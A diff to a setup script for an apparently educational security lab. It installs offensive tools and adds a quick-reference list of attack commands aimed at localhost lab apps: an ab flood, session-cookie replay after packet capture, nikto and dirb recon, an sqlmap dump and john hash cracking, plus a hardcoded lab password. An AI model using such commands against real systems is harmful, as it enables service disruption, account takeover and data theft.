@@ -4,7 +4,8 @@ set -euo pipefail
 echo "🔧 Installing lab prerequisites..."
 sudo apt-get update -y
 sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
-  john hydra tcpdump curl nmap git less openssh-server openssl
+  john hydra tcpdump curl nmap git less openssh-server openssl \
+  apache2-utils dirb nikto sqlmap python3-flask
 
 echo "🔐 Configuring sshd for localhost-only, password auth..."
 sudo mkdir -p /etc/ssh/sshd_config.d
@@ -85,7 +86,34 @@ Quick commands for the lab:
 3) Tcpdump (capture 20 packets; run curl in another terminal to generate noise)
    sudo tcpdump -i any -c 20
    curl https://example.com
+
+4) Phishing email review
+   cat phishing_email.txt
+
+5) DoS flood test (Task 5)
+   ab -n 1000 -c 50 http://localhost:8080/
+   curl -s http://localhost:8080/stats -o dos_report.json
+
+6) Session hijacking (Task 6)
+   sudo timeout 20 tcpdump -i lo -A -s 0 'tcp port 5001' > session_capture.log 2>&1
+   curl -s -b "session=<stolen_token>" http://localhost:5001/account -o session_hijack_flag.txt
+
+7) Web recon (Task 7)
+   nikto -h http://localhost:8000
+   dirb http://localhost:8000/ scripts/web_wordlist.txt
+   curl http://localhost:8000/hidden-admin/flag.txt -o web_recon_flag.txt
+
+8) SQL injection (Task 8)
+   sqlmap -u "http://localhost:5002/user?id=1" --batch --dump
+   john --wordlist=scripts/sqli_wordlist.txt sqli_extracted_hash.txt
 EOF
+
+echo "🔐 Generating SQL injection lab admin password hash (Task 8)..."
+SQLI_PASSWORD="Dragon2024!"
+openssl passwd -6 -salt sqlisalt "${SQLI_PASSWORD}" > "${WORKDIR}/apps/.sqli_admin_hash"
+
+echo "🚀 Making lab scripts executable..."
+chmod +x "${WORKDIR}"/scripts/*.sh "${WORKDIR}"/apps/*.sh 2>/dev/null || true
 
 # Make sure ownership is correct for the vscode user
 sudo chown -R vscode:vscode "${WORKDIR}"
